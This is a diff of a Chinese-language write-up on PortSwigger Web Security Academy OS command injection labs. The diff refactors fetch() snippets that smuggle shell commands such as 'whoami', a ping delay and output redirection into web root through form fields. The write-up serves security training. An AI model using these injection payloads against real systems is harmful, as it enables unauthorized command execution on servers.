@@ -25,7 +25,6 @@ fetch(`${location.origin}/product/stock`, {
   },
   body: `productId=${encodeURIComponent(`1 & echo whoami &`)}&storeId=1`,
   method: "POST",
-  mode: "cors",
   credentials: "include",
 });
 ```
@@ -51,18 +50,14 @@ https://portswigger.net/web-security/os-command-injection#useful-commands
 Submit Feedback 有四個欄位，一一嘗試，最後在 Email 欄位成功注入
 
 ```js
-fetch(
-  "https://0ab5003d0384976783d7877800ec00b5.web-security-academy.net/feedback/submit",
-  {
-    headers: {
-      "content-type": "application/x-www-form-urlencoded",
-    },
-    body: `csrf=Xy0bXtNRAf5VjmXzRbakwTedvYsJXjku&name=123&email=${encodeURIComponent(`& ping -c 10 127.0.0.1 &`)}&subject=123&message=123`,
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/feedback/submit`, {
+  headers: {
+    "content-type": "application/x-www-form-urlencoded",
   },
-);
+  body: `csrf=Xy0bXtNRAf5VjmXzRbakwTedvYsJXjku&name=123&email=${encodeURIComponent(`& ping -c 10 127.0.0.1 &`)}&subject=123&message=123`,
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 ## Lab: Blind OS command injection with output redirection
@@ -81,12 +76,11 @@ fetch(`${location.origin}/feedback/submit`, {
   },
   body: `csrf=02NO2AVme1exgRgZnEWVTK9MruR7ZKmw&name=123&email=${encodeURIComponent(`& whoami > /var/www/images/whoami.txt &`)}&subject=123&message=123`,
   method: "POST",
-  mode: "cors",
   credentials: "include",
 });
 ```
 
-之後訪問 `https://0ac5001b0488aee08068675300bd00b4.web-security-academy.net/image?filename=whoami.txt`
+之後訪問 `/image?filename=whoami.txt`
 
 ## Lab: Blind OS command injection with out-of-band interaction
 
